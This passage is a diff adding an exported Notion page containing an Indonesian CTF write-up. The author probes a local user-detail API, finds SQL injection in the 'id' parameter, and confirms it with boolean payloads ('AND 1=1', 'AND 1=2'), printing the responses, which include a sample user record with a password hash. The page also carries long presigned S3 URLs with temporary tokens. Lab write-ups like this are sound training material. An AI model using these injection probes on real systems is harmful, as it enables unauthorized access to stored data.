Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=7047deab9110b037b6afd2eeffff19cc9df457d32dc02b3e748866919919b17e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81e9-a55d-fc8a785d0442",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8158-9512-d7cc0fb2ba11",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "banyak user, saya coba cari flag nya.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-813d-b531-d5cb04149135",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-8.png",
+          "expiry_time": "2025-09-18T02:37:20.940Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-8.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/5f61bbb1-4971-4e20-bbbc-9fd558156e1c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013720Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=a0315aacedd9d47e8588a1640788fdd940cb240e6071cfa798780ff5936ef887&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81a0-b837-e69fb0ff24cc",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8142-8a5d-fbb96ded42ec",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Flag 1 berhasil didapatkan.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81ac-b89e-da977b6e5f11",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-818b-8ef7-fd9382002902",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Lanjut cari flag 2/3",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81a1-b4b2-db529bce29f5",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81cc-95e2-fa07f9c348ab",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Terlihat pada ada sebuah query/param untuk melihat detail user:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-818d-8dee-fc139b2de2af",
+        "type": "code",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "url for get detail user http://localhost/api/users/?id=",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "266db469-a81d-81fd-abe5-dd1f74b5ff57",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81c9-b529-ff77b57aa769",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Lalu saya coba akses detail user 1 hasilnya seperti pada gambar berikut:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8163-a2cb-ffe39ecb6d34",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-9.png",
+          "expiry_time": "2025-09-18T02:37:21.028Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-9.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/7b4d9687-06a9-4ef9-b40c-43de68cb1825/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=519632db2db450088a93b4ca8e6818bc7891dc5f3d308e8ec805d3429ccd9c29&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81f4-9fce-fd83a9025ef7",
+        "type": "code",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "\n{\"status_code\":200,\"data\":[{\"id\":1,\"name\":\"Queen McClure\",\"email\":\"lue.feeney@example.org\",\"email_verified_at\":\"2022-10-03 18:35:59\",\"password\":\"$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC\\/.og\\/at2.uheWG\\/igi\",\"remember_token\":\"B8nQLUsy6Z\",\"created_at\":\"2022-10-03 18:35:59\",\"updated_at\":\"2022-10-03 18:35:59\"}]}",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "266db469-a81d-8139-8495-e13a1efeace1",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8152-85f9-fee7853aabca",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Lanjut, saya mencoba mencari parameter dengan ParamSpider, dan tools lainnya hasilnya tidak memuaskan. Tetapi ada yang menarik pada parameter ?id=, saya coba berikan tanda petik di akhir id, dan hasilnya terdapat kerentanan SQL Injection:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-813e-a974-fd211faaa68b",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8107-b123-db95a6db14cb",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-10.png",
+          "expiry_time": "2025-09-18T02:37:21.050Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-10.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/65877be5-77cd-4360-b2f7-911b257835d9/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=769e9110deffbe51a4e9974ccc3334b6eafed112e89103508634f3d42114bf92&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81e5-9129-e0372282e076",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81b0-9566-cf432696e59e",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Untuk memastikannya, apakah ada kerentanan atau tidaknya, saya coba pakai payload",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-813d-b316-d04768bc9e40",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "?id=231 AND 1=1",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-818f-ba33-d7eb3cbc2691",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-11.png",
+          "expiry_time": "2025-09-18T02:37:21.049Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-11.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/96efc78b-eb02-4ba2-85bd-4a7e19007b78/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=b80fe7b57b1a91cd76ec5e7aeebf1f00bf359263f6249d31c09e6e5a0aaf505e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-8106-937f-ceddb8ff0846",
+        "type": "code",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "{\"status_code\":200,\"data\":[{\"id\":1,\"name\":\"Queen McClure\",\"email\":\"lue.feeney@example.org\",\"email_verified_at\":\"2022-10-03 18:35:59\",\"password\":\"$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC\\/.og\\/at2.uheWG\\/igi\",\"remember_token\":\"B8nQLUsy6Z\",\"created_at\":\"2022-10-03 18:35:59\",\"updated_at\":\"2022-10-03 18:35:59\"}]}",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "266db469-a81d-8164-a1a9-d11388d5c9b5",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Yups hasilnya tetap sama. Lanjut coba ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "?id=231 AND 1=2",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " . Payload ini harusnya response dari server tidak memberikan data. Berikut hasilnya:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8134-8724-fed913b5104d",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-07T11:30:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-12.png",
+          "expiry_time": "2025-09-18T02:37:21.047Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-12.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/ecaa5e78-6d0d-4682-9882-5516234dbd28/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=a7b7923e2ef4111c6c23ed1d8d2d3aa19adec85f3ffa9bd3ffb59c4ba6b95c62&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81e3-bf32-d32fa6cd4851",
+        "type": "code",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "{\"status_code\":200,\"data\":[]}",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "266db469-a81d-8180-815a-c3ee05771ac9",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
